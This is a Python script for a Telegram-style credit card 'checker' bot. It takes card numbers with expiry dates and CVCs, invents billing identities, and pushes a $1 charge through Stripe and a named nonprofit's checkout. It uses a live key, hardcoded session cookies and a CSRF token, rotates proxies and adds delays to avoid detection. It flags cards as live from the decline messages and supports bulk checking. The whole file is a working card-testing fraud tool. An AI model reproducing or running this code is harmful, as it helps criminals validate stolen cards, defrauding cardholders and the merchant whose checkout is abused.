import requests
import random
import time
import threading

def random_name():
    first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Charles', 'Joseph', 'Thomas']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def random_email(name):
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    name_part = name.lower().replace(' ', '.')
    return f"{name_part}{random.randint(100, 999)}@{random.choice(domains)}"

def random_phone():
    return f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

def random_address():
    streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Elm St', 'Pine Rd']
    cities_states_zips = [
        ('New York', 'NY', '10001'),
        ('Los Angeles', 'CA', '90001'),
        ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'),
        ('Phoenix', 'AZ', '85001')
    ]
    city, state, zip_code = random.choice(cities_states_zips)
    street_num = random.randint(100, 9999)
    street = random.choice(streets)
    return f"{street_num} {street}", city, state, zip_code

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            if not proxies:
                return None
            proxy = random.choice(proxies).strip()

            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            elif len(parts) == 2:
                host, port = parts
                proxy_dict = {
                    'http': f'http://{host}:{port}',
                    'https': f'http://{host}:{port}'
                }
                return proxy_dict
            return None
    except:
        return None

def get_bin_info(bin_number):
    """Get BIN information"""
    if not bin_number or len(bin_number) < 6:
        return {'brand': 'UNKNOWN', 'type': 'CREDIT', 'level': 'STANDARD', 'bank': 'UNKNOWN', 'country': 'UNKNOWN', 'emoji': '🏳️'}
    
    if bin_number.startswith('4'):
        brand = 'VISA'
    elif bin_number.startswith('5'):
        brand = 'MASTERCARD'
    elif bin_number.startswith('34') or bin_number.startswith('37'):
        brand = 'AMEX'
    elif bin_number.startswith('6'):
        brand = 'DISCOVER'
    else:
        brand = 'UNKNOWN'
    
    return {
        'brand': brand,
        'type': 'CREDIT',
        'level': 'STANDARD',
        'bank': f'{brand} BANK',
        'country': 'UNITED STATES',
        'emoji': '🇺🇸'
    }

def check_status(response_data):
    """Check the status based on the actual site response"""
    try:
        if response_data.get("status") == "SUCCESS" or response_data.get("success") is True:
            return "APPROVED CC", "Payment successful - $1 charged", True
        
        failure_type = response_data.get("failureType", "")
        error_message = response_data.get("error", "")
        
        full_message = ""
        if failure_type:
            full_message += f"{failure_type}"
        if error_message:
            if isinstance(error_message, dict):
                full_message += f" - {error_message.get('message', '')}"
            else:
                full_message += f" - {error_message}"
        
        full_message = full_message.strip()
        if not full_message:
            full_message = "Declined"
        
        approved_patterns = ['insufficient funds', 'avs', 'duplicate', 'cvv']
        for pattern in approved_patterns:
            if pattern in full_message.lower():
                return "APPROVED CC", full_message, True
        
        return "DECLINED CC", full_message, False
        
    except:
        return "UNKNOWN", "Error parsing response", False

def test_charge(cc_line):
    start_time = time.time()
    
    try:
        time.sleep(random.uniform(1, 3))
        
        parts = cc_line.strip().split('|')
        if len(parts) < 4:
            return "❌ Invalid CC format"
        
        ccn, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        name = random_name()
        email = random_email(name)
        phone = random_phone()
        street, city, state, zip_code = random_address()
        
        headers = {  
            'Chargeority': 'api.stripe.com',  
            'accept': 'application/json',  
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
            'content-type': 'application/x-www-form-urlencoded',  
            'origin': 'https://js.stripe.com',  
            'referer': 'https://js.stripe.com/',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-site',  
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
        }  

        data = f'billing_details[address][city]={city}&billing_details[address][country]=US&billing_details[address][line1]={street.replace(" ", "+")}&billing_details[address][line2]=&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&billing_details[name]={name.replace(" ", "+")}&billing_details[email]={email}&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'  

        proxy_dict = get_random_proxy()
        
        if proxy_dict:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_dict, timeout=30, verify=False)
        else:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30, verify=False)

        apx = response.json()  
        pid = apx.get("id", "FAILED")
        
        if pid == "FAILED":
            error_msg = apx.get('error', {}).get('message', 'Unknown error')
            elapsed_time = time.time() - start_time
            bin_info = get_bin_info(ccn[:6])
            
            return f"""
❌ DECLINED CC

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand')} - {bin_info.get('type')} - {bin_info.get('level')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country')} {bin_info.get('emoji')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        time.sleep(random.uniform(2, 4))

        cookies = {  
            'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',  
            'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',  
            'ss_cvt': '1760724937850',  
            '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',  
            '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',  
        }  

        headers = {  
            'Chargeority': 'www.onamissionkc.org',  
            'accept': 'application/json, text/plain, */*',  
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',  
            'content-type': 'application/json',  
            'origin': 'https://www.onamissionkc.org',  
            'referer': 'https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',  
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',  
            'sec-ch-ua-mobile': '?1',  
            'sec-ch-ua-platform': '"Android"',  
            'sec-fetch-dest': 'empty',  
            'sec-fetch-mode': 'cors',  
            'sec-fetch-site': 'same-origin',  
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',  
            'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',  
        }  

        json_data = {  
            'email': email,  
            'subscribeToList': False,  
            'shippingAddress': {  
                'id': '',  
                'firstName': '',  
                'lastName': '',  
                'line1': '',  
                'line2': '',  
                'city': '',  
                'region': state,  
                'postalCode': '',  
                'country': '',  
                'phoneNumber': '',  
            },  
            'createNewUser': False,  
            'newUserPassword': None,  
            'saveShippingAddress': False,  
            'makeDefaultShippingAddress': False,  
            'customFormData': None,  
            'shippingAddressId': None,  
            'proposedAmountDue': {  
                'decimalValue': '1',  
                'currencyCode': 'USD',  
            },  
            'cartToken': 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',  
            'paymentToken': {  
                'stripePaymentTokenType': 'PAYMENT_METHOD_ID',  
                'token': pid,  
                'type': 'STRIPE',  
            },  
            'billToShippingAddress': False,  
            'billingAddress': {  
                'id': '',  
                'firstName': name.split()[0],  
                'lastName': name.split()[1],  
                'line1': street,  
                'line2': '',  
                'city': city,  
                'region': state,  
                'postalCode': zip_code,  
                'country': 'US',  
                'phoneNumber': phone,  
            },  
            'savePaymentInfo': False,  
            'makeDefaultPayment': False,  
            'paymentCardId': None,  
            'universalPaymentElementEnabled': True,  
        }  

        if proxy_dict:
            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
        else:
            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)

        apx1 = response1.json()
        
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info(ccn[:6])
        
        status, reason, approved = check_status(apx1)

        return f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand')} - {bin_info.get('type')} - {bin_info.get('level')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country')} {bin_info.get('emoji')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

    except Exception as e:
        elapsed_time = time.time() - start_time
        return f"""
❌ ERROR

💳𝗖𝗖 ⇾ {cc_line.strip()}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe $1 Charge

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# Single CC check function for /st command
def check_single_cc(cc_line):
    return test_charge(cc_line)

# Mass CC check function for /mst command  
def check_mass_cc(cc_lines):
    """Process multiple CCs - keep original function signature"""
    results = []
    for cc_line in cc_lines:
        try:
            result = test_charge(cc_line.strip())
            results.append(result)
            # Add delay between requests
            time.sleep(random.uniform(2, 4))
        except Exception as e:
            results.append(f"❌ Error processing card: {str(e)}")
    
    return results
